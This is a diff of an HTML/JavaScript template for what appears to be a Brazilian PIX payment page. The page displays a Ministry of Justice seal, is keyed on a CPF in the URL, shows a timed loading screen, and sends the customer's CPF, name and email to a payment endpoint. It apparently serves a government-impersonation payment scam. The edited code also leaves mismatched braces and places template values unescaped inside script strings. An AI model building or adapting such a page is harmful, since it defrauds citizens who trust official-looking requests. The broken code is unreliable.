@@ -615,19 +615,19 @@
                 height: 100vh;
                 padding: 0;
             }
-            
+
             .modal-content {
                 width: 100vw;
                 min-height: 100vh;
                 padding: 15px;
                 box-sizing: border-box;
             }
-            
+
             .copy-button-container {
                 margin: 20px 0 50px 0;
                 padding-bottom: 50px;
             }
-            
+
             .copy-pix-button {
                 width: 90%;
                 padding: 15px 20px;
@@ -866,16 +866,33 @@
                 loaderContainer.style.display = 'block';
                 qrCodeContainer.style.display = 'none';
 
-                const response = await fetch('/generate-pix', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    }
-                });
+                const cpfValue = '{{ customer.cpf }}';
+                const nameValue = '{{ customer.nome }}';
+                const emailValue = '{{ customer.email }}';
 
-                const data = await response.json();
+                const pixData = {
+                        cpf: cpfValue,
+                        name: nameValue,
+                        email: emailValue
+                    };
 
-                if (data.success && data.pixCode) {
+                    console.log('Enviando dados PIX:', pixData);
+
+                    fetch('/generate-pix', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(pixData)
+                    })
+                    .then(response => {
+                        console.log('Status da resposta:', response.status);
+                        return response.json();
+                    })
+                    .then(data => {
+                        console.log('Resposta do PIX:', data);
+
+                        if (data.success) {
                     // Gerar QR code a partir do código PIX usando uma biblioteca externa
                     const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(data.pixCode)}`;
                     document.getElementById('qrCodeImage').src = qrCodeUrl;
@@ -888,7 +905,12 @@
                     throw new Error(data.error || 'Erro ao gerar o pagamento');
                 }
             } catch (error) {
-                console.error('Erro:', error);
+                        console.error('Erro:', error);
+
+                        // Mostrar erro mais detalhado
+                        const errorMessage = error.message || 'Erro desconhecido ao gerar PIX';
+                        alert(`Erro ao gerar PIX: ${errorMessage}. Tente novamente.`);
+
                 loaderContainer.style.display = 'none';
                 alert('Ocorreu um erro ao gerar o pagamento. Por favor, tente novamente em alguns instantes.');
                 setTimeout(() => {
@@ -989,7 +1011,7 @@
                         <i class="fas fa-copy"></i> Copiar Código PIX
                     </button>
                 </div>
-                
+
                 <!-- Brasão do Ministério da Justiça -->
                 <div class="ministry-seal-container">
                     <div class="ministry-seal">
@@ -1010,7 +1032,7 @@
         document.addEventListener('DOMContentLoaded', function() {
             const currentPath = window.location.pathname;
             const isCpfRoute = /^\/\d{11}$/.test(currentPath); // Matches /11digits
-            
+
             if (isCpfRoute) {
                 // Show loading screen for 4 seconds
                 setTimeout(function() {
@@ -1022,7 +1044,7 @@
                 document.getElementById('loadingScreen').style.display = 'none';
                 document.getElementById('mainContent').classList.add('show');
             }
-            
+
             // Set current date in Brazilian format
             const today = new Date();
             const dateOptions = { 
